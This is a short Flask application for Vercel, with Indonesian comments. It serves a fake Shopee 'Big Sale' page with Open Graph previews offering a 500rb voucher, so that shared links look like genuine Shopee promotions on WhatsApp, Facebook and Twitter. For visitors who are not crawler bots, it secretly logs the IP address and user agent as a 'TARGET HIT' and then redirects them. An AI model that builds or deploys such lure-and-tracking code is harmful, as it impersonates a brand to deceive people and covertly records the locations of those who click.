from flask import Flask, request, render_template_string

# Vercel mencari variable bernama 'app' ini secara otomatis
app = Flask(__name__)

# --- CONFIG GAMBAR & LINK ---
IMAGE_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/600px-Shopee.svg.png"
TARGET_URL = "https://shopee.co.id/product/12345/67890"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee Big Sale</title>
    <meta name="description" content="Diskon 99% Khusus Hari Ini.">
    <meta property="og:site_name" content="Shopee">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Kejutan Shopee - Voucher 500rb">
    <meta property="og:description" content="Klik untuk klaim sebelum hangus.">
    <meta property="og:image" content="{{ image }}">
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="315">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="{{ image }}">
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
        .msg { color: #555; font-size: 14px; }
    </style>
</head>
<body>
    <p class="msg">Sedang memuat...</p>
    <script>
        setTimeout(function(){
            window.location.href = "{{ target }}";
        }, 1000);
    </script>
</body>
</html>
"""

# PERBAIKAN: Jangan gunakan nama 'handler' di sini
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    # Cek User Agent
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Deteksi Bot WhatsApp / Facebook
    is_bot = "facebookexternalhit" in user_agent or "whatsapp" in user_agent or "twitterbot" in user_agent

    if is_bot:
        return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)
    else:
        user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
        print(f"!!! TARGET HIT !!! IP: {user_ip} | UA: {user_agent}")
        return render_template_string(HTML_TEMPLATE, image=IMAGE_URL, target=TARGET_URL)

# Note: Tidak perlu app.run()